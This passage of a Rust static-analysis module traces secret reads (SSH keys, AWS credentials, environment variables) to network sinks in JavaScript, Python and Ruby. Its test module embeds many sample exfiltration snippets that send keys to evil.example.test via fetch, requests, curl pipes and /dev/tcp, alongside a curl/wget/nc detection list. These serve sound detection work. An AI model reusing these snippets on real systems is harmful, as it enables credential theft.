        ("assignment_expression", AstLang::JavaScript) => {
            parent.child_by_field_name("left").map(|n| text(n, src).to_string())
        }
        ("pair", AstLang::JavaScript) => {
            parent.child_by_field_name("key").map(|n| text(n, src).to_string())
        }
        ("assignment", AstLang::Python | AstLang::Ruby) => {
            parent.child_by_field_name("left").map(|n| text(n, src).to_string())
        }
        _ => None,
    }
}

/// Seed + fixed-point taint over a scope's direct statements only — no
/// sink reporting, no recursion into nested scopes. Shared by
/// `analyze_scope` and `scope_returns_taint`.
fn compute_scope_taint(
    scope: Node,
    src: &[u8],
    lang: AstLang,
    inherited: &TaintMap,
    returns: &TaintMap,
) -> TaintMap {
    let mut tainted = inherited.clone();
    for _ in 0..6 {
        let mut changed = false;
        for_each_direct(scope, &mut |node| {
            if let Some((name, rhs)) = assignment_parts(node, src, lang) {
                if let Some(sec) = expr_taint(rhs, src, lang, &tainted, returns) {
                    if tainted.insert(name, sec).map(|p| p.0) != Some(sec.0) {
                        changed = true;
                    }
                }
            }
            if let Some((recv, sec)) = receiver_taint(node, src, lang, &tainted) {
                if let std::collections::hash_map::Entry::Vacant(e) = tainted.entry(recv) {
                    e.insert(sec);
                    changed = true;
                }
            }
        });
        if !changed {
            break;
        }
    }
    tainted
}

/// Does this function scope `return` (JS/Py) — or, for Ruby, end its body
/// with — a tainted value?
fn scope_returns_taint(
    scope: Node,
    src: &[u8],
    lang: AstLang,
    returns: &TaintMap,
) -> Option<(Capability, &'static str)> {
    let tainted = compute_scope_taint(scope, src, lang, &TaintMap::new(), returns);
    let mut hit = None;
    for_each_direct(scope, &mut |node| {
        if hit.is_some() {
            return;
        }
        let is_return = matches!(node.kind(), "return_statement" | "return");
        if is_return {
            if let Some(sec) = expr_taint(node, src, lang, &tainted, returns) {
                hit = Some(sec);
            }
        }
    });
    hit
}

fn is_scope_node(kind: &str) -> bool {
    matches!(
        kind,
        "function_declaration"
            | "function_expression"
            | "function"
            | "arrow_function"
            | "generator_function"
            | "generator_function_declaration"
            | "method_definition"
            | "function_definition"
            | "lambda"
            // Ruby
            | "method"
            | "singleton_method"
    )
    // NOT "block" — that is Python's function *body*, and Ruby's
    // `do…end` / `{…}` blocks are close enough to the enclosing method's
    // scope (they capture its locals) that folding them in is a safe
    // over-approximation.
}

/// Visit every node under `scope` that belongs to `scope` directly —
/// i.e. stop descending at a nested function/lambda boundary.
fn for_each_direct<'a>(scope: Node<'a>, f: &mut dyn FnMut(Node<'a>)) {
    let mut cursor = scope.walk();
    for child in scope.children(&mut cursor) {
        walk_within_scope(child, f);
    }
}

fn walk_within_scope<'a>(node: Node<'a>, f: &mut dyn FnMut(Node<'a>)) {
    if is_scope_node(node.kind()) {
        return;
    }
    f(node);
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        walk_within_scope(child, f);
    }
}

/// The nested function/lambda scopes directly inside `scope` (not their
/// own nested scopes — `analyze_scope` recurses for those).
fn nested_scopes<'a>(scope: Node<'a>, out: &mut Vec<Node<'a>>) {
    let mut cursor = scope.walk();
    for child in scope.children(&mut cursor) {
        find_first_scopes(child, out);
    }
}

fn find_first_scopes<'a>(node: Node<'a>, out: &mut Vec<Node<'a>>) {
    if is_scope_node(node.kind()) {
        out.push(node);
        return;
    }
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        find_first_scopes(child, out);
    }
}

#[allow(clippy::too_many_arguments)]
fn analyze_scope(
    scope: Node,
    src: &[u8],
    lang: AstLang,
    path: &Path,
    inherited: &TaintMap,
    returns: &TaintMap,
    param_sinks: &ParamSinks,
    out: &mut Vec<CapabilityFinding>,
    reported: &mut HashSet<(Capability, usize)>,
) {
    let tainted = compute_scope_taint(scope, src, lang, inherited, returns);

    // Sink check over this scope's direct calls.
    for_each_direct(scope, &mut |node| {
        if is_call(node.kind()) {
            check_exfil_sink(node, src, lang, path, &tainted, returns, out, reported);
            check_param_sink_call(node, src, lang, path, &tainted, returns, param_sinks, out, reported);
        }
    });

    // Recurse into nested function scopes with this scope's final taint.
    let mut nested = Vec::new();
    nested_scopes(scope, &mut nested);
    for child_scope in nested {
        analyze_scope(
            child_scope, src, lang, path, &tainted, returns, param_sinks, out, reported,
        );
    }
}

/// A call to a function summarised as passing a parameter to a network
/// sink, made with a tainted argument in that parameter position →
/// exfiltration.
#[allow(clippy::too_many_arguments)]
fn check_param_sink_call(
    node: Node,
    src: &[u8],
    lang: AstLang,
    path: &Path,
    tainted: &TaintMap,
    returns: &TaintMap,
    param_sinks: &ParamSinks,
    out: &mut Vec<CapabilityFinding>,
    reported: &mut HashSet<(Capability, usize)>,
) {
    if param_sinks.is_empty() {
        return;
    }
    let Some(callee) = callee_path(node, src, lang) else {
        return;
    };
    let name = callee.rsplit('.').next().unwrap_or(&callee);
    let Some(sinking_params) = param_sinks.get(name).or_else(|| param_sinks.get(&callee)) else {
        return;
    };
    let Some(args) = node.child_by_field_name("arguments") else {
        return;
    };

    // Any tainted argument at all — positional matching would need the
    // callee's parameter list here; since the function is *known* to send
    // some parameter to the wire, a tainted argument reaching it is the
    // flow. (The summary already excluded functions with no sinking
    // parameter, so this is not "any call with a tainted arg".)
    let taint = args
        .named_children(&mut args.walk())
        .find_map(|a| expr_taint(a, src, lang, tainted, returns));
    let Some((cap, label)) = taint else {
        return;
    };
    let line = line_of(node);
    if !reported.insert((cap, line)) {
        return;
    }
    let plist = sinking_params.iter().cloned().collect::<Vec<_>>().join(", ");
    out.push(CapabilityFinding {
        capability: cap,
        basis: EvidenceBasis::Inferred,
        evidence: format!(
            "AST taint: {label} is passed to `{callee}`, which forwards its `{plist}` parameter to a network sink"
        ),
        location: Some(format!("{}:{}", path.display(), line)),
    });
    out.push(CapabilityFinding {
        capability: Capability::NetworkExternal,
        basis: EvidenceBasis::Inferred,
        evidence: format!("AST taint: `{callee}` forwards a tainted argument to the network (line {line})"),
        location: Some(format!("{}:{}", path.display(), line)),
    });
}

/// A call is an exfiltration sink if it is a network sink and a
/// data-bearing argument is tainted, OR it is a shell exec whose arguments
/// carry both a network tool (`curl`/`wget`/`nc`) and a tainted value.
#[allow(clippy::too_many_arguments)]
fn check_exfil_sink(
    node: Node,
    src: &[u8],
    lang: AstLang,
    path: &Path,
    tainted: &TaintMap,
    returns: &TaintMap,
    out: &mut Vec<CapabilityFinding>,
    reported: &mut HashSet<(Capability, usize)>,
) {
    let Some(callee) = callee_path(node, src, lang) else {
        return;
    };
    let Some(args) = node.child_by_field_name("arguments") else {
        return;
    };

    // A local print is not a wire write.
    if callee.starts_with("console.")
        || callee.starts_with("process.stdout")
        || callee.starts_with("process.stderr")
        || callee == "print"
        || callee.starts_with("logging.")
    {
        return;
    }

    let net_sink = is_network_sink(&callee, lang);
    let exec_sink = is_shell_exec(&callee, lang)
        && descendant_strings(args, src)
            .iter()
            .any(|s| command_string_exfil_channel(s));
    if !net_sink && !exec_sink {
        return;
    }

    let ids = descendant_identifiers(args, src);
    let via_var = ids
        .iter()
        .find_map(|id| tainted.get(id).map(|s| (*s, id.clone())));
    let via_inline = expr_taint(args, src, lang, tainted, returns).map(|s| (s, String::new()));

    let Some(((cap, label), var)) = via_var.or(via_inline) else {
        return;
    };
    let line = line_of(node);
    if !reported.insert((cap, line)) {
        return;
    }
    let sink_desc = if exec_sink && !net_sink {
        format!("`{callee}` running a network command (curl/wget/nc//dev/tcp)")
    } else {
        format!("`{callee}`")
    };
    let how = if var.is_empty() {
        format!("a read of {label} is passed straight to {sink_desc}")
    } else {
        format!("`{var}` (holds {label}) reaches {sink_desc}")
    };
    out.push(CapabilityFinding {
        capability: cap,
        basis: EvidenceBasis::Inferred,
        evidence: format!("AST taint: {how} — secret material flows to a network sink"),
        location: Some(format!("{}:{}", path.display(), line)),
    });
    out.push(CapabilityFinding {
        capability: Capability::NetworkExternal,
        basis: EvidenceBasis::Inferred,
        evidence: format!("AST taint: {sink_desc} receives tainted secret material (line {line})"),
        location: Some(format!("{}:{}", path.display(), line)),
    });
}

fn is_network_tool(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l == "curl"
        || l == "wget"
        || l == "nc"
        || l == "ncat"
        || l == "telnet"
        || l.contains("curl ")
        || l.contains("wget ")
        || l.contains("| nc")
        || l.contains("|nc")
}

/// `receiver.method(args)` where `method` stages data and an argument is
/// tainted → the receiver (if a bare identifier) becomes tainted too.
fn receiver_taint(
    node: Node,
    src: &[u8],
    lang: AstLang,
    tainted: &TaintMap,
) -> Option<(String, (Capability, &'static str))> {
    if !is_call(node.kind()) {
        return None;
    }
    let func = node.child_by_field_name("function")?;
    if func.kind() != "member_expression" && func.kind() != "attribute" {
        return None;
    }
    let method = func
        .child_by_field_name("property")
        .or_else(|| func.child_by_field_name("attribute"))
        .map(|p| text(p, src).to_string())?;
    if !matches!(
        method.as_str(),
        "append" | "write" | "set" | "add" | "push" | "put" | "concat" | "update" | "send"
    ) {
        return None;
    }
    let recv = func.child_by_field_name("object")?;
    if recv.kind() != "identifier" {
        return None;
    }
    let args = node.child_by_field_name("arguments")?;
    let sec = expr_taint(args, src, lang, tainted, &TaintMap::new())?;
    Some((text(recv, src).to_string(), sec))
}

/// Taint of an expression: an inline secret read, a reference to an
/// already-tainted name, or a call to a function summarised as
/// returning tainted data.
fn expr_taint(
    node: Node,
    src: &[u8],
    lang: AstLang,
    tainted: &TaintMap,
    returns: &TaintMap,
) -> Option<(Capability, &'static str)> {
    if let Some(sec) = expr_is_secret_source(node, src, lang) {
        return Some(sec);
    }
    if !returns.is_empty() {
        let mut hit = None;
        walk(node, &mut |n| {
            if hit.is_some() || !is_call(n.kind()) {
                return;
            }
            if let Some(callee) = callee_path(n, src, lang) {
                // match on the bare function name (`grab`) or a method
                // name (`this.grab` → `grab`)
                let name = callee.rsplit('.').next().unwrap_or(&callee);
                if let Some(sec) = returns.get(name).or_else(|| returns.get(&callee)) {
                    hit = Some(*sec);
                }
            }
        });
        if hit.is_some() {
            return hit;
        }
    }
    descendant_identifiers(node, src)
        .iter()
        .find_map(|id| tainted.get(id).copied())
}

/// `(assigned name, value node)` for a JS `variable_declarator` /
/// `assignment_expression` or a Py `assignment`. Only single-identifier
/// targets — destructuring is out of scope.
fn assignment_parts<'a>(node: Node<'a>, src: &[u8], lang: AstLang) -> Option<(String, Node<'a>)> {
    let (target_field, value_field) = match (node.kind(), lang) {
        ("variable_declarator", AstLang::JavaScript) => ("name", "value"),
        ("assignment_expression" | "augmented_assignment_expression", AstLang::JavaScript) => {
            ("left", "right")
        }
        // `x = ...`, `x += ...`, and the walrus `(x := ...)`
        ("assignment" | "augmented_assignment" | "named_expression", AstLang::Python) => {
            ("left", "right")
        }
        ("assignment" | "operator_assignment", AstLang::Ruby) => ("left", "right"),
        _ => return None,
    };
    let target = node.child_by_field_name(target_field)?;
    if target.kind() != "identifier" {
        return None;
    }
    let value = node.child_by_field_name(value_field)?;
    Some((text(target, src).to_string(), value))
}

/// Is this expression node (or something directly inside it) a read of
/// secret material? Covers `fs.readFileSync("~/.ssh/id_rsa")`,
/// `open(os.path.join(home, ".aws", "credentials"))`, `process.env`,
/// `os.environ`.
fn expr_is_secret_source(
    node: Node,
    src: &[u8],
    lang: AstLang,
) -> Option<(Capability, &'static str)> {
    // Don't treat a nested function value as a secret — `const f = () =>
    // readKey()` makes `f` a function, not the key.
    if is_scope_node(node.kind()) {
        return None;
    }
    let mut hit = None;
    walk(node, &mut |n| {
        if hit.is_some() {
            return;
        }
        // env access
        if let Some(p) = member_path(n, src) {
            if p == "process.env"
                || p.starts_with("process.env.")
                || p == "os.environ"
                || p.starts_with("os.environ.")
            {
                hit = Some((Capability::EnvironmentVariables, "an environment variable"));
                return;
            }
        }
        // Ruby `ENV['X']` → `element_reference` with object `ENV`.
        if n.kind() == "element_reference" {
            if let Some(obj) = n.child_by_field_name("object") {
                if text(obj, src) == "ENV" {
                    hit = Some((Capability::EnvironmentVariables, "an environment variable"));
                    return;
                }
            }
        }
        if is_call(n.kind()) {
            if let Some(callee) = callee_path(n, src, lang) {
                let last = callee.rsplit('.').next().unwrap_or(&callee);
                if last == "getenv" || callee == "os.getenv" || callee == "ENV.fetch" {
                    hit = Some((Capability::EnvironmentVariables, "an environment variable"));
                    return;
                }
                if is_file_read(&callee, lang) {
                    if let Some(args) = n.child_by_field_name("arguments") {
                        let segs = descendant_strings(args, src);
                        if let Some(sec) = segs
                            .iter()
                            .find_map(|s| secret_path_capability(s))
                            .or_else(|| joined_segments_are_secret(&segs))
                        {
                            hit = Some(sec);
                        }
                    }
                }
            }
        }
        // bare string literal naming a secret (e.g. readFileSync(p) where
        // p was `const p = "~/.ssh/id_rsa"`)
        if n.kind() == "string" {
            if let Some(s) = string_value(n, src) {
                if let Some(sec) = secret_path_capability(&s) {
                    hit = Some(sec);
                }
            }
        }
    });
    hit
}

fn is_network_sink(callee: &str, lang: AstLang) -> bool {
    let last = callee.rsplit('.').next().unwrap_or(callee);
    match lang {
        AstLang::JavaScript => {
            // `write` / `send` / `end` are kept from the first increment
            // (a socket / http.ClientRequest write); `check_exfil_sink`
            // filters out `console.*` / `process.stdout` receivers so a
            // local print isn't mistaken for a wire write. Bare `get` is
            // deliberately NOT here — `map.get` / `params.get` are far too
            // common; an HTTP GET client shows up via the `axios` / `got`
            // / `.request` paths instead.
            matches!(
                last,
                "fetch" | "request" | "write" | "send" | "end" | "post" | "put" | "patch"
                    | "lookup" | "resolve" | "resolve4" | "resolveAny" | "query"
            ) || callee.starts_with("axios")
                || callee.starts_with("got.")
                || callee.starts_with("superagent.")
        }
        AstLang::Python => {
            matches!(
                last,
                "send" | "sendall" | "sendto" | "urlopen" | "getaddrinfo" | "gethostbyname"
                    | "create_connection"
            ) || callee.starts_with("requests.")
                || callee.starts_with("httpx.")
                || callee.starts_with("aiohttp.")
                || callee.starts_with("urllib.")
        }
        AstLang::Ruby => {
            (matches!(last, "post" | "put" | "patch" | "request" | "write" | "send")
                && !callee.starts_with("STDOUT")
                && !callee.starts_with("STDERR"))
                || callee.starts_with("Net::HTTP")
                || callee.starts_with("HTTParty")
                || callee.starts_with("RestClient")
                || callee.starts_with("Faraday")
                || callee == "URI.open"
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn caps(source: &str, lang: AstLang) -> Vec<Capability> {
        let mut c: Vec<_> = analyze(source, lang, Path::new("t"))
            .into_iter()
            .map(|f| f.capability)
            .collect();
        c.sort();
        c.dedup();
        c
    }

    #[test]
    fn js_split_ssh_path_via_path_join_is_caught() {
        let src = r#"
            const os = require('os');
            const fs = require('fs');
            const p = require('path').join(os.homedir(), '.ssh', 'id_rsa');
            const key = fs.readFileSync(p, 'utf8');
        "#;
        assert!(caps(src, AstLang::JavaScript).contains(&Capability::ReadSsh));
    }

    #[test]
    fn js_taint_ssh_key_to_fetch_body_flags_exfiltration() {
        let src = r#"
            const fs = require('fs');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
            const payload = { data: key };
            fetch('https://evil.example.com/collect', { method: 'POST', body: JSON.stringify(payload) });
        "#;
        let f = analyze(src, AstLang::JavaScript, Path::new("t"));
        assert!(f.iter().any(|x| x.capability == Capability::ReadSsh && x.evidence.contains("taint")));
        assert!(f.iter().any(|x| x.capability == Capability::NetworkExternal));
    }

    #[test]
    fn python_taint_env_to_requests_post() {
        let src = r#"
import os
import requests
token = os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://evil.example.com", data={"t": token})
"#;
        let f = analyze(src, AstLang::Python, Path::new("t"));
        assert!(f.iter().any(|x| x.capability == Capability::EnvironmentVariables && x.evidence.contains("taint")));
        assert!(f.iter().any(|x| x.capability == Capability::NetworkExternal));
    }

    #[test]
    fn python_open_aws_credentials_then_urlopen() {
        let src = r#"
import os, urllib.request
creds = open(os.path.join(os.path.expanduser("~"), ".aws", "credentials")).read()
urllib.request.urlopen(urllib.request.Request("http://x/c", data=creds.encode()))
"#;
        let f = analyze(src, AstLang::Python, Path::new("t"));
        assert!(f.iter().any(|x| x.capability == Capability::ReadCredentials));
    }

    #[test]
    fn benign_js_reading_a_config_file_is_not_flagged() {
        let src = r#"
            const fs = require('fs');
            const cfg = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            fetch('https://api.example.com/data').then(r => r.json());
        "#;
        let c = caps(src, AstLang::JavaScript);
        assert!(!c.contains(&Capability::ReadSsh));
        assert!(!c.contains(&Capability::CloudCredentials));
        // no taint finding: config.json isn't secret material
        let f = analyze(src, AstLang::JavaScript, Path::new("t"));
        assert!(!f.iter().any(|x| x.evidence.contains("taint")));
    }

    #[test]
    fn benign_python_using_env_for_config_without_network_is_low() {
        let src = r#"
import os
DEBUG = os.environ.get("DEBUG", "0")
LEVEL = os.getenv("LOG_LEVEL")
print(DEBUG, LEVEL)
"#;
        let f = analyze(src, AstLang::Python, Path::new("t"));
        // env read is reported, but no taint-to-network finding
        assert!(!f.iter().any(|x| x.evidence.contains("taint")));
    }

    #[test]
    fn js_exec_curl_exfil_command_string_is_flagged() {
        let src = r#"
            const { execSync } = require('child_process');
            execSync('cat ~/.ssh/id_rsa | curl -X POST --data-binary @- https://evil.example.com');
        "#;
        assert!(caps(src, AstLang::JavaScript).contains(&Capability::ExecuteShell));
    }

    #[test]
    fn typescript_type_annotations_do_not_break_parsing() {
        let src = r#"
            import * as fs from 'fs';
            const read = (p: string): string => fs.readFileSync(p, 'utf8');
            const key: string = read(process.env.HOME + '/.ssh/id_rsa');
            const send = async (b: Record<string, unknown>): Promise<void> => {
              await fetch('https://evil.example.com', { method: 'POST', body: JSON.stringify(b) });
            };
            send({ key });
        "#;
        // ReadSsh from the split path at minimum; parser must not bail.
        assert!(caps(src, AstLang::JavaScript).contains(&Capability::ReadSsh));
    }

    fn has_taint(source: &str, lang: AstLang) -> bool {
        analyze(source, lang, Path::new("t"))
            .iter()
            .any(|f| f.evidence.contains("taint"))
    }

    #[test]
    fn taint_does_not_cross_unrelated_function_scopes() {
        // `k` is a local of `readIt`; `sendIt` references a *different*
        // `k` (its own param). Whole-file taint would have false-flagged
        // this; function-scope taint must not.
        let src = r#"
            const fs = require('fs');
            function readIt() {
              const k = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
              return k.length;
            }
            function sendIt(k) {
              return fetch('https://api.example.com', { method: 'POST', body: k });
            }
            readIt(); sendIt('hello');
        "#;
        assert!(!has_taint(src, AstLang::JavaScript), "must not flag: separate scopes");
    }

    #[test]
    fn taint_flows_into_a_nested_closure() {
        // `key` is module-level; the arrow function that posts it captures
        // it. Inherited taint must reach the nested scope.
        let src = r#"
            const fs = require('fs');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
            const send = () => fetch('https://evil.example.test', { method: 'POST', body: key });
            send();
        "#;
        assert!(has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn taint_through_formdata_append_then_fetch() {
        let src = r#"
            const fs = require('fs');
            const creds = fs.readFileSync(require('os').homedir() + '/.aws/credentials', 'utf8');
            const form = new FormData();
            form.append('f', creds);
            fetch('https://evil.example.test/u', { method: 'POST', body: form });
        "#;
        let f = analyze(src, AstLang::JavaScript, Path::new("t"));
        assert!(f.iter().any(|x| x.capability == Capability::ReadCredentials && x.evidence.contains("taint")));
    }

    #[test]
    fn taint_through_execfile_curl_arg_array() {
        let src = r#"
            const { execFile } = require('child_process');
            const fs = require('fs');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
            execFile('curl', ['-X', 'POST', '--data-binary', key, 'https://evil.example.test']);
        "#;
        assert!(has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn python_augmented_assignment_propagates_taint() {
        let src = r#"
import os, requests
buf = ""
buf += os.environ["AWS_SECRET_ACCESS_KEY"]
requests.post("https://evil.example.test", data=buf)
"#;
        assert!(has_taint(src, AstLang::Python));
    }

    #[test]
    fn stdout_write_of_a_secret_is_not_a_network_sink() {
        let src = r#"
            const fs = require('fs');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
            process.stdout.write(key);
        "#;
        assert!(!has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn benign_js_map_get_with_env_key_is_not_flagged() {
        let src = r#"
            const cache = new Map();
            const region = process.env.AWS_REGION;
            const entry = cache.get(region);
        "#;
        assert!(!has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn bare_netrc_mention_does_not_escalate_but_a_read_does() {
        // A security tool listing `.netrc` as a sensitive file in its own
        // code must NOT be flagged as reading raw secret material.
        let bare = "const SENSITIVE = ['.netrc', '.aws/credentials', '.ssh'];";
        let bc = caps(bare, AstLang::JavaScript);
        assert!(!bc.contains(&Capability::ReadCredentials), "bare mention escalated: {bc:?}");
        // An actual read of it does escalate.
        let read = "const fs = require('fs'); const c = fs.readFileSync(process.env.HOME + '/.netrc');";
        assert!(caps(read, AstLang::JavaScript).contains(&Capability::ReadCredentials));
    }

    #[test]
    fn install_string_only_flags_inside_an_exec() {
        let bare = "const help = 'To add a dependency, run: pip install <name>';";
        assert!(!caps(bare, AstLang::JavaScript).contains(&Capability::InstallPackage));
        let real = "const { execSync } = require('child_process'); execSync('pip install requests');";
        assert!(caps(real, AstLang::JavaScript).contains(&Capability::InstallPackage));
    }

    #[test]
    fn shell_profile_string_only_flags_on_a_write() {
        let bare = "const RC = require('os').homedir() + '/.bashrc'; const exists = require('fs').existsSync(RC);";
        assert!(!caps(bare, AstLang::JavaScript).contains(&Capability::ShellProfile));
        let real = "require('fs').appendFileSync(require('os').homedir() + '/.bashrc', 'export X=1');";
        assert!(caps(real, AstLang::JavaScript).contains(&Capability::ShellProfile));
    }

    #[test]
    fn parameter_taint_secret_passed_into_an_uploader() {
        // `upload(d)` sends its parameter; `main` calls it with the key.
        let src = r#"
            const fs = require('fs');
            function upload(d) {
              return fetch('https://evil.example.test/u', { method: 'POST', body: d });
            }
            function main() {
              const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
              upload(key);
            }
            main();
        "#;
        assert!(has_taint(src, AstLang::JavaScript), "{:?}", analyze(src, AstLang::JavaScript, Path::new("t")));
    }

    #[test]
    fn parameter_taint_python_keyword_arg() {
        let src = r#"
import os, requests
def ship(payload):
    requests.post("https://evil.example.test", data=payload)
def run():
    tok = os.environ["AWS_SECRET_ACCESS_KEY"]
    ship(tok)
run()
"#;
        assert!(has_taint(src, AstLang::Python));
    }

    #[test]
    fn parameter_sink_function_called_with_a_benign_arg_is_not_flagged() {
        let src = r#"
            function upload(d) { return fetch('https://api.example.com', { method: 'POST', body: d }); }
            function main() { upload(JSON.stringify({ ok: true })); }
            main();
        "#;
        assert!(!has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn dev_tcp_bash_exfil_channel_is_flagged() {
        let src = r#"
            const { execSync } = require('child_process');
            const fs = require('fs');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
            execSync('bash -c "cat > /dev/tcp/evil.example.test/443" <<< ' + key);
        "#;
        assert!(has_taint(src, AstLang::JavaScript), "{:?}", analyze(src, AstLang::JavaScript, Path::new("t")));
    }

    #[test]
    fn base64_staged_secret_still_reaches_the_sink() {
        let src = r#"
            const fs = require('fs');
            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
            const enc = Buffer.from(key).toString('base64');
            fetch('https://evil.example.test', { method: 'POST', body: enc });
        "#;
        assert!(has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn ast_flags_runtime_npm_install_and_shell_profile_write() {
        let src = r#"
            const { execSync } = require('child_process');
            execSync('npm install --global some-package');
            const fs = require('fs');
            fs.appendFileSync(process.env.HOME + '/.bashrc', 'export EVIL=1\n');
        "#;
        let c = caps(src, AstLang::JavaScript);
        assert!(c.contains(&Capability::InstallPackage), "{c:?}");
        assert!(c.contains(&Capability::ShellProfile), "{c:?}");
    }

    #[test]
    fn ast_flags_cloud_credential_env_name_and_websocket() {
        let src = r#"
            const token = process.env.AWS_SECRET_ACCESS_KEY;
            const ws = new WebSocket('wss://evil.example.test');
        "#;
        let c = caps(src, AstLang::JavaScript);
        assert!(c.contains(&Capability::CloudCredentials), "{c:?}");
        assert!(c.contains(&Capability::NetworkExternal), "{c:?}");
    }

    #[test]
    fn taint_through_a_helper_functions_return_value() {
        // `grab()` returns the SSH key; `main` posts `grab()`'s result.
        // The interprocedural summary must connect them across the call.
        let src = r#"
            const fs = require('fs');
            const os = require('os');
            function grab() {
              return fs.readFileSync(require('path').join(os.homedir(), '.ssh', 'id_rsa'), 'utf8');
            }
            async function main() {
              const data = grab();
              await fetch('https://evil.example.test/i', { method: 'POST', body: data });
            }
            main();
        "#;
        assert!(has_taint(src, AstLang::JavaScript), "{:?}", analyze(src, AstLang::JavaScript, Path::new("t")));
    }

    #[test]
    fn taint_through_a_helper_returning_an_object_literal() {
        let src = r#"
            const fs = require('fs');
            function collect() {
              const material = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
              return { material };
            }
            async function report() {
              await fetch('https://c.example.test', { method: 'POST', body: JSON.stringify(collect()) });
            }
            report();
        "#;
        assert!(has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn helper_that_returns_a_non_secret_is_not_a_taint_source() {
        let src = r#"
            const fs = require('fs');
            function loadConfig() { return JSON.parse(fs.readFileSync('./config.json', 'utf8')); }
            async function main() {
              await fetch('https://api.example.com', { method: 'POST', body: JSON.stringify(loadConfig()) });
            }
            main();
        "#;
        assert!(!has_taint(src, AstLang::JavaScript));
    }

    #[test]
    fn python_helper_return_taint() {
        let src = r#"
import os, requests
def get_token():
    return os.environ["AWS_SECRET_ACCESS_KEY"]
def send():
    requests.post("https://evil.example.test", data={"t": get_token()})
send()
"#;
        assert!(has_taint(src, AstLang::Python));
    }

    #[test]
    fn ruby_env_secret_to_net_http_post_is_tainted() {
        let src = r#"
require 'net/http'
key = ENV['AWS_SECRET_ACCESS_KEY']
uri = URI('http://evil.example.test')
Net::HTTP.post(uri, key)
"#;
        assert!(has_taint(src, AstLang::Ruby), "{:?}", analyze(src, AstLang::Ruby, Path::new("t")));
    }

    #[test]
    fn ruby_file_read_ssh_key_via_backtick_curl_is_flagged() {
        let src = r#"
key = File.read(File.join(Dir.home, '.ssh', 'id_rsa'))
`curl -s -d @- https://evil.example.test <<< #{key}`
"#;
        let c = caps(src, AstLang::Ruby);
        assert!(c.contains(&Capability::ReadSsh), "{c:?}");
    }

    #[test]
    fn ruby_benign_config_read_is_not_flagged() {
        let src = r#"
require 'json'
config = JSON.parse(File.read('config.json'))
puts config['name']
"#;
        assert!(!caps(src, AstLang::Ruby).contains(&Capability::ReadSsh));
        assert!(!has_taint(src, AstLang::Ruby));
    }

    #[test]
    fn empty_and_garbage_input_do_not_panic() {
        assert!(analyze("", AstLang::JavaScript, Path::new("t")).is_empty());
        let _ = analyze("}{ not js at all ((( ", AstLang::JavaScript, Path::new("t"));
        let _ = analyze("def (:::", AstLang::Python, Path::new("t"));
        let _ = analyze("def foo; end; ((", AstLang::Ruby, Path::new("t"));
    }
}
